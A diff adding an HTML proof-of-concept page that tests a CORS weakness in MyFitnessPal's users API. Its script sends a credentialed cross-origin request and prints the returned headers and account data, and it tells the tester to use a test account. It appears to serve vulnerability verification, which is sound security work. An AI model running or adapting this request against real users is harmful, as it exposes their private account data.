@@ -1,0 +1,62 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Simple CORS PoC — MyFitnessPal</title>
+  <style>
+    body{font-family:system-ui;margin:18px}
+    pre{white-space:pre-wrap;border:1px solid #ddd;padding:10px;background:#fafafa}
+    button{padding:8px 12px}
+  </style>
+</head>
+<body>
+  <h2>Simple CORS PoC — GET /api/services/users</h2>
+  <p>Host this on an HTTPS origin (GitHub Pages recommended). Open it in the <strong>same browser profile</strong> where you're logged into your test account.</p>
+  <button id="run">Run PoC</button>
+  <p>Status: <span id="status">idle</span></p>
+
+  <h3>Response headers (printed)</h3>
+  <pre id="headers">—</pre>
+
+  <h3>Response body (printed)</h3>
+  <pre id="body">—</pre>
+
+<script>
+document.getElementById('run').onclick = async () => {
+  const status = document.getElementById('status');
+  const headersOut = document.getElementById('headers');
+  const bodyOut = document.getElementById('body');
+
+  status.textContent = 'sending GET with credentials...';
+  headersOut.textContent = '...';
+  bodyOut.textContent = '...';
+
+  try {
+    const resp = await fetch('https://www.myfitnesspal.com/api/services/users', {
+      method: 'GET',
+      credentials: 'include',
+      headers: { 'Accept': 'application/json' },
+      redirect: 'follow'
+    });
+
+    status.textContent = 'response status: ' + resp.status;
+
+    const hdrs = {};
+    for (const [k,v] of resp.headers.entries()) hdrs[k] = v;
+    headersOut.textContent = JSON.stringify(hdrs, null, 2);
+
+    const text = await resp.text();
+    try {
+      bodyOut.textContent = JSON.stringify(JSON.parse(text), null, 2);
+    } catch (e) {
+      bodyOut.textContent = text;
+    }
+  } catch (err) {
+    status.textContent = 'fetch error';
+    headersOut.textContent = '';
+    bodyOut.textContent = String(err);
+  }
+};
+</script>
+</body>
+</html>
